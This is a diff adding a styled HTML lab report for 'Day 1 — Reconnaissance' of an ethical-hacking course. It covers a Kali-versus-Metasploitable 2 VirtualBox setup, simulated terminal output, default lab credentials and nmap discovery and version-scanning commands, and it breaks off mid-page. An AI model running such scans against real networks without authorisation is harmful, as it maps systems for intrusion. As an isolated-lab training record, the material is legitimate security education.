@@ -1,0 +1,1619 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Day 1 — Ethical Hacking & Cybersecurity</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --green: #00ff88;
+    --cyan: #00d4ff;
+    --red: #ff3c3c;
+    --orange: #ff8c00;
+    --yellow: #ffd700;
+    --dark: #050a0e;
+    --dark2: #0a1520;
+    --dark3: #0d1f2d;
+    --panel: rgba(0,255,136,0.04);
+    --border: rgba(0,255,136,0.15);
+    --font-mono: 'Share Tech Mono', monospace;
+    --font-body: 'Rajdhani', sans-serif;
+    --font-head: 'Orbitron', monospace;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--dark);
+    color: #c8e6d0;
+    font-family: var(--font-body);
+    font-size: 17px;
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  /* ─── GRID BG ─── */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* ─── SCANLINES ─── */
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.08) 2px,
+      rgba(0,0,0,0.08) 4px
+    );
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* ─── NAV ─── */
+  nav {
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    z-index: 100;
+    background: rgba(5,10,14,0.92);
+    backdrop-filter: blur(12px);
+    border-bottom: 1px solid var(--border);
+    padding: 12px 32px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .nav-logo {
+    font-family: var(--font-head);
+    font-size: 12px;
+    color: var(--green);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+  }
+
+  .nav-links {
+    display: flex;
+    gap: 24px;
+    list-style: none;
+  }
+
+  .nav-links a {
+    font-family: var(--font-mono);
+    font-size: 11px;
+    color: rgba(200,230,208,0.5);
+    text-decoration: none;
+    letter-spacing: 1px;
+    transition: color 0.2s;
+  }
+  .nav-links a:hover { color: var(--green); }
+
+  @media (max-width: 768px) {
+    .nav-links { display: none; }
+  }
+
+  /* ─── SECTIONS ─── */
+  section {
+    position: relative;
+    z-index: 1;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    padding: 120px 6vw 80px;
+  }
+
+  /* ─── HERO ─── */
+  #hero {
+    min-height: 100vh;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    padding: 80px 6vw;
+    background: radial-gradient(ellipse 80% 60% at 50% 50%, rgba(0,255,136,0.05) 0%, transparent 70%);
+  }
+
+  .hero-badge {
+    display: inline-block;
+    font-family: var(--font-mono);
+    font-size: 11px;
+    letter-spacing: 3px;
+    color: var(--green);
+    border: 1px solid rgba(0,255,136,0.3);
+    padding: 6px 18px;
+    margin-bottom: 32px;
+    animation: fadeUp 0.8s ease both;
+  }
+
+  .hero-title {
+    font-family: var(--font-head);
+    font-size: clamp(32px, 6vw, 76px);
+    font-weight: 900;
+    line-height: 1.1;
+    letter-spacing: 2px;
+    color: #fff;
+    margin-bottom: 16px;
+    animation: fadeUp 0.8s 0.1s ease both;
+  }
+
+  .hero-title span {
+    color: var(--green);
+    text-shadow: 0 0 30px rgba(0,255,136,0.5);
+  }
+
+  .hero-sub {
+    font-family: var(--font-head);
+    font-size: clamp(14px, 2vw, 22px);
+    color: var(--cyan);
+    letter-spacing: 4px;
+    margin-bottom: 40px;
+    animation: fadeUp 0.8s 0.2s ease both;
+  }
+
+  .hero-meta {
+    display: flex;
+    gap: 40px;
+    justify-content: center;
+    flex-wrap: wrap;
+    animation: fadeUp 0.8s 0.3s ease both;
+  }
+
+  .meta-item {
+    text-align: center;
+  }
+
+  .meta-label {
+    font-family: var(--font-mono);
+    font-size: 10px;
+    color: rgba(200,230,208,0.4);
+    letter-spacing: 2px;
+    display: block;
+    margin-bottom: 4px;
+  }
+
+  .meta-value {
+    font-family: var(--font-head);
+    font-size: 14px;
+    color: var(--green);
+    letter-spacing: 1px;
+  }
+
+  .warning-bar {
+    margin-top: 60px;
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    background: rgba(255,60,60,0.08);
+    border: 1px solid rgba(255,60,60,0.3);
+    padding: 10px 24px;
+    font-family: var(--font-mono);
+    font-size: 12px;
+    color: var(--red);
+    letter-spacing: 1px;
+    animation: pulse-red 2s infinite;
+  }
+
+  @keyframes pulse-red {
+    0%, 100% { box-shadow: 0 0 0 rgba(255,60,60,0); }
+    50% { box-shadow: 0 0 16px rgba(255,60,60,0.2); }
+  }
+
+  /* ─── SECTION HEADERS ─── */
+  .section-header {
+    margin-bottom: 48px;
+  }
+
+  .section-num {
+    font-family: var(--font-mono);
+    font-size: 11px;
+    color: var(--green);
+    letter-spacing: 3px;
+    margin-bottom: 8px;
+  }
+
+  .section-title {
+    font-family: var(--font-head);
+    font-size: clamp(22px, 4vw, 44px);
+    font-weight: 700;
+    color: #fff;
+    line-height: 1.2;
+  }
+
+  .section-title span { color: var(--green); }
+
+  .section-line {
+    width: 60px;
+    height: 2px;
+    background: linear-gradient(90deg, var(--green), transparent);
+    margin-top: 16px;
+  }
+
+  /* ─── PANELS ─── */
+  .panel {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    padding: 28px 32px;
+    position: relative;
+  }
+
+  .panel::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0;
+    width: 3px; height: 100%;
+    background: var(--green);
+  }
+
+  .panel-title {
+    font-family: var(--font-head);
+    font-size: 13px;
+    color: var(--green);
+    letter-spacing: 2px;
+    margin-bottom: 16px;
+  }
+
+  /* ─── GRID LAYOUTS ─── */
+  .grid-2 {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 24px;
+  }
+
+  .grid-3 {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 20px;
+  }
+
+  @media (max-width: 900px) {
+    .grid-2, .grid-3 { grid-template-columns: 1fr; }
+  }
+
+  /* ─── VM CARDS ─── */
+  .vm-card {
+    background: rgba(0,212,255,0.04);
+    border: 1px solid rgba(0,212,255,0.15);
+    padding: 28px;
+    position: relative;
+  }
+
+  .vm-card.attacker { border-color: rgba(255,60,60,0.25); background: rgba(255,60,60,0.04); }
+  .vm-card.target { border-color: rgba(0,255,136,0.25); }
+
+  .vm-title {
+    font-family: var(--font-head);
+    font-size: 13px;
+    letter-spacing: 2px;
+    margin-bottom: 20px;
+  }
+
+  .vm-card.attacker .vm-title { color: var(--red); }
+  .vm-card.target .vm-title { color: var(--green); }
+
+  .vm-row {
+    display: flex;
+    gap: 12px;
+    margin-bottom: 8px;
+    font-size: 14px;
+    font-family: var(--font-body);
+  }
+
+  .vm-key {
+    color: rgba(200,230,208,0.45);
+    min-width: 90px;
+    font-size: 12px;
+    letter-spacing: 0.5px;
+  }
+
+  .vm-val { color: #e0f0e8; font-family: var(--font-mono); font-size: 13px; }
+
+  /* ─── TOPOLOGY ─── */
+  .topology {
+    background: rgba(0,0,0,0.4);
+    border: 1px solid var(--border);
+    padding: 32px;
+    font-family: var(--font-mono);
+    font-size: 14px;
+    color: var(--cyan);
+    text-align: center;
+    line-height: 2.2;
+    margin-top: 24px;
+  }
+
+  .topo-node {
+    display: inline-block;
+    background: rgba(0,212,255,0.08);
+    border: 1px solid rgba(0,212,255,0.3);
+    padding: 8px 24px;
+    color: var(--cyan);
+    font-size: 13px;
+  }
+
+  .topo-arrow {
+    display: block;
+    color: rgba(200,230,208,0.3);
+    font-size: 12px;
+    letter-spacing: 1px;
+  }
+
+  /* ─── CODE BLOCKS ─── */
+  .code-block {
+    background: rgba(0,0,0,0.5);
+    border: 1px solid rgba(0,255,136,0.1);
+    border-left: 3px solid var(--green);
+    padding: 20px 24px;
+    font-family: var(--font-mono);
+    font-size: 13px;
+    color: var(--green);
+    overflow-x: auto;
+    margin: 16px 0;
+    line-height: 1.8;
+  }
+
+  .code-comment { color: rgba(200,230,208,0.35); }
+  .code-cmd { color: var(--cyan); }
+
+  /* ─── PORT TABLE ─── */
+  .port-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: var(--font-body);
+    font-size: 15px;
+    overflow: hidden;
+  }
+
+  .port-table th {
+    font-family: var(--font-head);
+    font-size: 11px;
+    letter-spacing: 2px;
+    color: var(--green);
+    text-align: left;
+    padding: 14px 16px;
+    border-bottom: 1px solid rgba(0,255,136,0.2);
+    background: rgba(0,255,136,0.05);
+  }
+
+  .port-table td {
+    padding: 12px 16px;
+    border-bottom: 1px solid rgba(255,255,255,0.04);
+    font-family: var(--font-mono);
+    font-size: 13px;
+    color: #c0dcc8;
+  }
+
+  .port-table tr:hover td { background: rgba(0,255,136,0.04); }
+
+  .risk {
+    display: inline-block;
+    padding: 3px 10px;
+    font-family: var(--font-head);
+    font-size: 10px;
+    letter-spacing: 1px;
+    border-radius: 2px;
+  }
+
+  .risk.critical { background: rgba(255,60,60,0.15); color: var(--red); border: 1px solid rgba(255,60,60,0.3); }
+  .risk.high { background: rgba(255,140,0,0.12); color: var(--orange); border: 1px solid rgba(255,140,0,0.3); }
+  .risk.medium { background: rgba(255,215,0,0.1); color: var(--yellow); border: 1px solid rgba(255,215,0,0.25); }
+
+  /* ─── CVE CARDS ─── */
+  .cve-card {
+    background: rgba(0,0,0,0.3);
+    border: 1px solid var(--border);
+    padding: 32px;
+    margin-bottom: 24px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .cve-card::after {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 100px; height: 100px;
+    background: radial-gradient(circle, rgba(255,60,60,0.07) 0%, transparent 70%);
+  }
+
+  .cve-header {
+    display: flex;
+    align-items: flex-start;
+    gap: 20px;
+    margin-bottom: 20px;
+    flex-wrap: wrap;
+  }
+
+  .cve-id {
+    font-family: var(--font-head);
+    font-size: 11px;
+    color: var(--red);
+    letter-spacing: 2px;
+    background: rgba(255,60,60,0.08);
+    border: 1px solid rgba(255,60,60,0.2);
+    padding: 6px 14px;
+    white-space: nowrap;
+  }
+
+  .cve-title {
+    font-family: var(--font-head);
+    font-size: 16px;
+    color: #fff;
+    flex: 1;
+  }
+
+  .cve-score {
+    font-family: var(--font-head);
+    font-size: 24px;
+    font-weight: 900;
+    color: var(--red);
+    text-shadow: 0 0 20px rgba(255,60,60,0.4);
+  }
+
+  .scenario-steps {
+    list-style: none;
+    margin: 16px 0;
+  }
+
+  .scenario-steps li {
+    display: flex;
+    gap: 14px;
+    margin-bottom: 10px;
+    font-size: 15px;
+    color: #b8d4c0;
+  }
+
+  .step-num {
+    font-family: var(--font-mono);
+    font-size: 11px;
+    color: var(--green);
+    background: rgba(0,255,136,0.08);
+    border: 1px solid rgba(0,255,136,0.2);
+    width: 24px; height: 24px;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+
+  /* ─── CTF TABLE ─── */
+  .ctf-table {
+    width: 100%;
+    border-collapse: collapse;
+  }
+
+  .ctf-table th {
+    font-family: var(--font-head);
+    font-size: 11px;
+    letter-spacing: 2px;
+    color: var(--cyan);
+    text-align: left;
+    padding: 14px 16px;
+    border-bottom: 1px solid rgba(0,212,255,0.2);
+    background: rgba(0,212,255,0.05);
+  }
+
+  .ctf-table td {
+    padding: 14px 16px;
+    border-bottom: 1px solid rgba(255,255,255,0.04);
+    font-size: 14px;
+    color: #b8d4c0;
+  }
+
+  .ctf-table td:first-child {
+    font-family: var(--font-head);
+    font-size: 12px;
+    color: var(--cyan);
+    letter-spacing: 1px;
+  }
+
+  .ctf-table tr:hover td { background: rgba(0,212,255,0.03); }
+
+  /* ─── PENDING CARDS ─── */
+  .pending-card {
+    background: rgba(0,0,0,0.35);
+    border: 1px solid var(--border);
+    padding: 36px 32px;
+    margin-bottom: 32px;
+    position: relative;
+  }
+
+  .pending-num {
+    font-family: var(--font-head);
+    font-size: 48px;
+    font-weight: 900;
+    color: rgba(0,255,136,0.07);
+    position: absolute;
+    top: 16px; right: 24px;
+    line-height: 1;
+  }
+
+  .pending-title {
+    font-family: var(--font-head);
+    font-size: 18px;
+    color: var(--cyan);
+    margin-bottom: 20px;
+    letter-spacing: 1px;
+  }
+
+  /* ─── COMPARE TABLE ─── */
+  .compare-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+    margin-top: 24px;
+  }
+
+  @media (max-width: 600px) {
+    .compare-grid { grid-template-columns: 1fr; }
+  }
+
+  .compare-col {
+    border: 1px solid var(--border);
+    padding: 24px;
+  }
+
+  .compare-col.bind { border-color: rgba(0,212,255,0.25); }
+  .compare-col.reverse { border-color: rgba(0,255,136,0.25); }
+
+  .compare-head {
+    font-family: var(--font-head);
+    font-size: 14px;
+    letter-spacing: 2px;
+    margin-bottom: 16px;
+  }
+
+  .compare-col.bind .compare-head { color: var(--cyan); }
+  .compare-col.reverse .compare-head { color: var(--green); }
+
+  .compare-item {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    margin-bottom: 10px;
+    font-size: 14px;
+    color: #aaccb4;
+  }
+
+  .compare-dot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    margin-top: 7px;
+    flex-shrink: 0;
+  }
+
+  .bind .compare-dot { background: var(--cyan); }
+  .reverse .compare-dot { background: var(--green); }
+
+  /* ─── DELIVERABLES ─── */
+  .deliverable-list {
+    list-style: none;
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 16px;
+  }
+
+  .deliverable-list li {
+    background: rgba(0,255,136,0.04);
+    border: 1px solid rgba(0,255,136,0.12);
+    padding: 16px 20px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-size: 14px;
+    color: #b8d4c0;
+    font-family: var(--font-body);
+  }
+
+  .del-icon {
+    font-family: var(--font-mono);
+    font-size: 11px;
+    color: var(--green);
+    background: rgba(0,255,136,0.08);
+    border: 1px solid rgba(0,255,136,0.2);
+    width: 28px; height: 28px;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+  }
+
+  /* ─── STATUS TABLE ─── */
+  .status-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr;
+    gap: 16px;
+    margin-bottom: 16px;
+  }
+
+  @media (max-width: 700px) {
+    .status-row { grid-template-columns: 1fr; }
+  }
+
+  .status-cell {
+    background: rgba(0,0,0,0.3);
+    border: 1px solid var(--border);
+    padding: 18px;
+  }
+
+  .status-concept {
+    font-family: var(--font-head);
+    font-size: 12px;
+    color: #d0e8d8;
+    letter-spacing: 1px;
+    margin-bottom: 8px;
+  }
+
+  .status-badge {
+    display: inline-block;
+    font-family: var(--font-head);
+    font-size: 9px;
+    letter-spacing: 1.5px;
+    padding: 3px 10px;
+    margin-bottom: 8px;
+  }
+
+  .status-badge.done { background: rgba(0,255,136,0.12); color: var(--green); border: 1px solid rgba(0,255,136,0.25); }
+  .status-badge.pending { background: rgba(255,140,0,0.1); color: var(--orange); border: 1px solid rgba(255,140,0,0.25); }
+
+  .status-next {
+    font-size: 12px;
+    color: rgba(200,230,208,0.45);
+    font-family: var(--font-mono);
+  }
+
+  /* ─── FOOTER ─── */
+  footer {
+    position: relative;
+    z-index: 1;
+    text-align: center;
+    padding: 60px 32px;
+    border-top: 1px solid var(--border);
+  }
+
+  .footer-logo {
+    font-family: var(--font-head);
+    font-size: 10px;
+    color: rgba(0,255,136,0.4);
+    letter-spacing: 4px;
+    margin-bottom: 12px;
+  }
+
+  .footer-names {
+    font-family: var(--font-mono);
+    font-size: 13px;
+    color: rgba(200,230,208,0.5);
+  }
+
+  /* ─── SCROLL REVEAL ─── */
+  .reveal {
+    opacity: 0;
+    transform: translateY(30px);
+    transition: opacity 0.7s ease, transform 0.7s ease;
+  }
+
+  .reveal.visible {
+    opacity: 1;
+    transform: translateY(0);
+  }
+
+  /* ─── KEYFRAMES ─── */
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(24px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0; }
+  }
+
+  .blink { animation: blink 1s step-end infinite; }
+
+  /* ─── TERMINAL SIMULATION ─── */
+  .terminal-wrap {
+    margin-top: 28px;
+  }
+
+  .terminal-label {
+    font-family: var(--font-mono);
+    font-size: 11px;
+    color: var(--cyan);
+    letter-spacing: 3px;
+    margin-bottom: 0;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .terminal-label::before {
+    content: '▶';
+    color: var(--green);
+    font-size: 9px;
+  }
+
+  .terminal-box {
+    background: #000;
+    border: 1px solid rgba(0,255,136,0.2);
+    border-top: none;
+    font-family: var(--font-mono);
+    font-size: 13px;
+    line-height: 1.7;
+    overflow: hidden;
+    position: relative;
+  }
+
+  .terminal-titlebar {
+    background: #0d1f0d;
+    border-bottom: 1px solid rgba(0,255,136,0.15);
+    padding: 8px 16px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .t-dot {
+    width: 11px; height: 11px;
+    border-radius: 50%;
+    display: inline-block;
+  }
+  .t-red   { background: #ff5f57; }
+  .t-yel   { background: #febc2e; }
+  .t-grn   { background: #28c840; }
+
+  .t-title {
+    font-size: 11px;
+    color: rgba(200,230,208,0.35);
+    margin-left: 8px;
+    letter-spacing: 1px;
+  }
+
+  .terminal-body {
+    padding: 18px 22px 22px;
+    min-height: 180px;
+    max-height: 340px;
+    overflow-y: auto;
+    scroll-behavior: smooth;
+  }
+
+  .terminal-body::-webkit-scrollbar { width: 4px; }
+  .terminal-body::-webkit-scrollbar-track { background: transparent; }
+  .terminal-body::-webkit-scrollbar-thumb { background: rgba(0,255,136,0.2); }
+
+  .t-line { display: block; margin: 1px 0; min-height: 1.7em; }
+  .t-prompt { color: var(--green); }
+  .t-user { color: var(--cyan); }
+  .t-at { color: rgba(200,230,208,0.4); }
+  .t-cmd { color: #e8f8ee; }
+  .t-out { color: rgba(200,230,208,0.6); }
+  .t-open { color: var(--green); font-weight: bold; }
+  .t-crit { color: var(--red); }
+  .t-high { color: var(--orange); }
+  .t-med  { color: var(--yellow); }
+  .t-info { color: var(--cyan); }
+  .t-success { color: #00ff88; }
+  .t-warn { color: var(--red); }
+  .t-cursor {
+    display: inline-block;
+    width: 8px; height: 14px;
+    background: var(--green);
+    vertical-align: text-bottom;
+    animation: blink 1s step-end infinite;
+  }
+
+  .terminal-body { padding-bottom: 18px; }
+
+  .video-label {
+    font-family: var(--font-mono);
+    font-size: 12px;
+    color: var(--cyan);
+    letter-spacing: 2px;
+    margin-bottom: 12px;
+    margin-top: 28px;
+  }
+
+  /* ─── NOTE BOX ─── */
+  .note {
+    display: flex;
+    gap: 14px;
+    background: rgba(255,215,0,0.05);
+    border: 1px solid rgba(255,215,0,0.2);
+    padding: 16px 20px;
+    margin: 16px 0;
+  }
+
+  .note-icon {
+    font-family: var(--font-mono);
+    font-size: 12px;
+    color: var(--yellow);
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+
+  .note-text {
+    font-size: 14px;
+    color: rgba(200,230,208,0.7);
+    font-family: var(--font-mono);
+    line-height: 1.6;
+  }
+
+  /* ─── SECTION BG ACCENTS ─── */
+  .bg-accent {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(80px);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  section > *:not(.bg-accent) { position: relative; z-index: 1; }
+
+  /* ─── PROGRESS BAR ─── */
+  #progress {
+    position: fixed;
+    top: 0; left: 0;
+    height: 2px;
+    background: linear-gradient(90deg, var(--green), var(--cyan));
+    z-index: 999;
+    transition: width 0.1s;
+    box-shadow: 0 0 8px var(--green);
+  }
+
+  /* Responsive table */
+  @media (max-width: 768px) {
+    .port-table thead { display: none; }
+    .port-table tr {
+      display: block;
+      background: rgba(0,0,0,0.2);
+      border: 1px solid var(--border);
+      margin-bottom: 12px;
+      padding: 12px;
+    }
+    .port-table td {
+      display: flex;
+      justify-content: space-between;
+      padding: 6px 8px;
+      border-bottom: 1px solid rgba(255,255,255,0.04);
+      font-size: 12px;
+    }
+    .port-table td::before {
+      content: attr(data-label);
+      font-family: var(--font-head);
+      font-size: 10px;
+      color: var(--green);
+      letter-spacing: 1px;
+      flex-shrink: 0;
+      margin-right: 12px;
+    }
+
+    section { padding: 100px 4vw 60px; }
+    .cve-card { padding: 24px 20px; }
+    .pending-card { padding: 28px 20px; }
+    .vm-card { padding: 20px; }
+  }
+</style>
+</head>
+<body>
+
+<div id="progress"></div>
+
+<nav>
+  <div class="nav-logo">Ethical Hacking Lab<span class="blink">_</span></div>
+  <ul class="nav-links">
+    <li><a href="#hero">Home</a></li>
+    <li><a href="#setup">Lab Setup</a></li>
+    <li><a href="#nmap">Nmap</a></li>
+    <li><a href="#cve">CVE Research</a></li>
+    <li><a href="#ctf">CTF</a></li>
+    <li><a href="#pending">Pending</a></li>
+    <li><a href="#summary">Summary</a></li>
+  </ul>
+</nav>
+
+<!-- ─── HERO ─── -->
+<section id="hero">
+  <div class="bg-accent" style="width:500px;height:400px;background:rgba(0,255,136,0.06);top:-100px;left:-100px;"></div>
+  <div class="hero-badge">CYBERSECURITY LABORATORY DOCUMENTATION</div>
+  <h1 class="hero-title">ETHICAL <span>HACKING</span><br>&amp; CYBERSECURITY</h1>
+  <div class="hero-sub">DAY 1 — RECONNAISSANCE</div>
+  <div class="hero-meta">
+    <div class="meta-item">
+      <span class="meta-label">PHASE</span>
+      <span class="meta-value">Reconnaissance</span>
+    </div>
+    <div class="meta-item">
+      <span class="meta-label">DIFFICULTY</span>
+      <span class="meta-value">Beginner</span>
+    </div>
+    <div class="meta-item">
+      <span class="meta-label">TOOLS</span>
+      <span class="meta-value">Nmap · NVD · VirtualBox</span>
+    </div>
+    <div class="meta-item">
+      <span class="meta-label">TEAM</span>
+      <span class="meta-value">Shad · Rafiu</span>
+    </div>
+  </div>
+  <div class="warning-bar">⚠ FOR EDUCATIONAL PURPOSES ONLY — AUTHORIZED LAB ENVIRONMENT</div>
+</section>
+
+<!-- ─── OVERVIEW ─── -->
+<section id="overview">
+  <div class="bg-accent" style="width:400px;height:300px;background:rgba(0,212,255,0.04);top:50%;right:-100px;"></div>
+  <div class="section-header reveal">
+    <div class="section-num">// 01</div>
+    <h2 class="section-title">Lab <span>Overview</span></h2>
+    <div class="section-line"></div>
+  </div>
+
+  <div class="panel reveal">
+    <div class="panel-title">OBJECTIVE</div>
+    <p>Understand basic reconnaissance techniques used in ethical hacking — scanning networks, identifying exposed services, correlating findings with known CVEs, and laying groundwork for CTF-style engagements.</p>
+  </div>
+
+  <br>
+
+  <div class="terminal-wrap reveal">
+    <div class="terminal-label">RECONNAISSANCE MINDSET — OBJECTIVES</div>
+    <div class="terminal-box">
+      <div class="terminal-titlebar">
+        <span class="t-dot t-red"></span><span class="t-dot t-yel"></span><span class="t-dot t-grn"></span>
+        <span class="t-title">kali@attacker: ~/recon</span>
+      </div>
+      <div class="terminal-body">
+<span class="t-line"><span class="t-prompt">┌──(</span><span class="t-user">kali</span><span class="t-at">@attacker</span><span class="t-prompt">)-[~/recon]</span></span>
+<span class="t-line"><span class="t-prompt">└─$ </span><span class="t-cmd">cat lab_objectives.txt</span></span>
+<span class="t-line"><span class="t-out">PHASE 1: Reconnaissance</span></span>
+<span class="t-line"><span class="t-out">  ├─ Identify live hosts on the subnet</span></span>
+<span class="t-line"><span class="t-out">  ├─ Enumerate open ports and services</span></span>
+<span class="t-line"><span class="t-out">  ├─ Match services to known CVEs</span></span>
+<span class="t-line"><span class="t-out">  └─ Prioritize attack surface for exploitation</span></span>
+<span class="t-line"> </span>
+<span class="t-line"><span class="t-prompt">└─$ </span><span class="t-cmd">ping -c 1 192.168.56.101</span></span>
+<span class="t-line"><span class="t-out">PING 192.168.56.101 56(84) bytes of data.</span></span>
+<span class="t-line"><span class="t-out">64 bytes from 192.168.56.101: icmp_seq=1 ttl=64 time=0.412 ms</span></span>
+<span class="t-line"><span class="t-success">[+] Target 192.168.56.101 is ALIVE — beginning recon...</span></span>
+<span class="t-line"><span class="t-prompt">└─$ </span><span class="t-cursor"></span></span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ─── LAB SETUP ─── -->
+<section id="setup">
+  <div class="section-header reveal">
+    <div class="section-num">// 02</div>
+    <h2 class="section-title">Virtual Lab <span>Setup</span></h2>
+    <div class="section-line"></div>
+  </div>
+
+  <div class="grid-2 reveal">
+    <div class="vm-card attacker">
+      <div class="vm-title">⚔ ATTACKER MACHINE — KALI LINUX</div>
+      <div class="vm-row"><span class="vm-key">OS</span><span class="vm-val">Kali Linux (Rolling)</span></div>
+      <div class="vm-row"><span class="vm-key">Role</span><span class="vm-val">Active scanner &amp; enumerator</span></div>
+      <div class="vm-row"><span class="vm-key">Tools</span><span class="vm-val">Nmap, Netcat, Nikto, MSF</span></div>
+      <div class="vm-row"><span class="vm-key">Network</span><span class="vm-val">Host-only adapter (eth0)</span></div>
+      <div class="vm-row"><span class="vm-key">IP Range</span><span class="vm-val">192.168.56.100–110</span></div>
+      <div class="vm-row"><span class="vm-key">Creds</span><span class="vm-val">kali / kali</span></div>
+    </div>
+
+    <div class="vm-card target">
+      <div class="vm-title">🎯 TARGET — METASPLOITABLE 2</div>
+      <div class="vm-row"><span class="vm-key">OS</span><span class="vm-val">Ubuntu 8.04 (Metasploitable 2)</span></div>
+      <div class="vm-row"><span class="vm-key">Role</span><span class="vm-val">Intentionally vulnerable target</span></div>
+      <div class="vm-row"><span class="vm-key">Services</span><span class="vm-val">FTP, SSH, HTTP, SMB, MySQL…</span></div>
+      <div class="vm-row"><span class="vm-key">Network</span><span class="vm-val">Host-only adapter (eth0)</span></div>
+      <div class="vm-row"><span class="vm-key">IP</span><span class="vm-val">192.168.56.101 (static)</span></div>
+      <div class="vm-row"><span class="vm-key">Creds</span><span class="vm-val">msfadmin / msfadmin</span></div>
+    </div>
+  </div>
+
+  <div class="topology reveal">
+    <div class="topo-node">Kali Linux — 192.168.56.100</div>
+    <div class="topo-arrow">│ Host-Only Network Switch │</div>
+    <div class="topo-node" style="border-color:rgba(0,255,136,0.3);color:var(--green);">Metasploitable — 192.168.56.101</div>
+    <div class="topo-arrow">│ No internet access │</div>
+  </div>
+
+  <div class="terminal-wrap reveal" style="margin-top:32px;">
+    <div class="terminal-label">VIRTUAL NETWORK — BOOT SEQUENCE</div>
+    <div class="terminal-box">
+      <div class="terminal-titlebar">
+        <span class="t-dot t-red"></span><span class="t-dot t-yel"></span><span class="t-dot t-grn"></span>
+        <span class="t-title">VirtualBox — Host-Only Network Init</span>
+      </div>
+      <div class="terminal-body">
+<span class="t-line"><span class="t-info">[VBOX] Initializing Host-Only Network Adapter...</span></span>
+<span class="t-line"><span class="t-out">  Interface: vboxnet0  |  Subnet: 192.168.56.0/24  |  DHCP: .100→.110</span></span>
+<span class="t-line"> </span>
+<span class="t-line"><span class="t-info">[BOOT] Starting Kali Linux VM...</span></span>
+<span class="t-line"><span class="t-out">  ✓ Kernel loaded  ✓ eth0 up  ✓ Network interfaces configured</span></span>
+<span class="t-line"><span class="t-success">  ✓ Kali ONLINE — IP: 192.168.56.100</span></span>
+<span class="t-line"> </span>
+<span class="t-line"><span class="t-info">[BOOT] Starting Metasploitable 2 VM...</span></span>
+<span class="t-line"><span class="t-out">  ✓ Ubuntu 8.04 kernel loaded</span></span>
+<span class="t-line"><span class="t-out">  ✓ vsftpd, sshd, smbd, apache2, mysqld started</span></span>
+<span class="t-line"><span class="t-success">  ✓ Metasploitable ONLINE — IP: 192.168.56.101</span></span>
+<span class="t-line"> </span>
+<span class="t-line"><span class="t-warn">[!] Target has intentional vulnerabilities. Isolated network only.</span></span>
+<span class="t-line"><span class="t-success">[✓] Lab ready. Both VMs reachable. No internet access confirmed.</span></span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ─── NMAP ─── -->
+<section id="nmap">
+  <div class="bg-accent" style="width:500px;height:400px;background:rgba(0,255,136,0.04);bottom:-100px;left:-150px;"></div>
+  <div class="section-header reveal">
+    <div class="section-num">// 03</div>
+    <h2 class="section-title">Nmap Scanning — <span>Methodology &amp; Results</span></h2>
+    <div class="section-line"></div>
+  </div>
+
+  <div class="panel reveal" style="margin-bottom:28px;">
+    <div class="panel-title">SCAN COMMANDS EXECUTED</div>
+    <div class="code-block">
+<span class="code-comment"># Step 1 — Host Discovery</span>
+<span class="code-cmd">nmap -sn 192.168.56.0/24</span>
+
+<span class="code-comment"># Step 2 — Fast Port Scan (common 1000 ports)</span>
+<span class="code-cmd">nmap -T4 -F 192.168.56.101</span>
+
+<span class="code-comment"># Step 3 — Service Version &amp; OS Detection</span>
+<span class="code-cmd">nmap -sV -sC -O -p 21,22,23,25,53,80,139,443,445,3306,5432,8180 192.168.56.101 -oN scan_results.txt</span>
+    </div>
+    <div class="note">
+      <span class="note-icon">NOTE</span>
+      <span class="note-text">The -sC flag runs Nmap's default scripts (NSE). The -oN flag saves results in normal format. Scans were run as root to enable SYN stealth scan (-sS, default with root privileges).</span>
+    </div>
+  </div>
+
+  <div class="reveal">
